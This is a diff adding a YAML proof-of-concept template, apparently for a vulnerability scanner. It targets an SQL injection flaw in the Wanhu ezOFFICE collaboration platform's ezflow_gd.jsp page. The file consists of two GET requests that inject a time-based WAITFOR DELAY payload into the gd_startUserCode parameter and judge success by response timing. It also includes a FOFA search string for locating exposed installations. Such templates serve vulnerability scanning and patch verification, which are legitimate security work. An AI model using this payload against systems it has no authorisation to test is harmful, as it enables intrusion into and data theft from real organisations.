@@ -1,0 +1,23 @@
+id: poc-yaml-whir-ezoffice-ezflowgd-jsp-sqli
+info:
+  name: 万户 ezOFFICE ezflow_gd.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="eZOFFICE协同管理平台"
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3BWAITFOR%20DELAY%20'0:0:{{.t1}}'--
+  expression: "status_code == 404 && \nduration >= t1 &&\nduration <= t2 &&\ntrim(body)\
+    \ == \"\"\n"
+- method: GET
+  path: /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3BWAITFOR%20DELAY%20'0:0:{{.t3}}'--
+  expression: "status_code == 404 && \nduration >= t3 &&\nduration <= t4 &&\ntrim(body)\
+    \ == \"\"\n"
+transport: http
